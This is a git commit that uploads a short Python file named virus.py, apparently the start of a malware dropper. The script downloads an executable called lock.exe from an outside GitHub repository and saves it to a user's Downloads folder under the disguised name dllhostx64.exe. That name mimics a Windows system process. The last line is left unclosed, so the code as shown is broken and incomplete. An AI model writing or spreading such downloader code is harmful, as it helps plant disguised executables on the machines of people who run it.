fcd74041d2db95ff1f707d35bdb2d9cfe220942d
GeneralRepublic <57861793+KaliSploit@users.noreply.github.com>
2020-09-17 14:11:26 +0300

    Add files via upload

---
+++ virus.py
@@ -0,0 +1,5 @@
+import urllib.request
+import time
+import os
+url = 'https://raw.githubusercontent.com/KaliSploit/vir/master/lock.exe'
+urllib.request.urlretrieve(url, '/Users/Admin/Downloads/dllhostx64.exe'
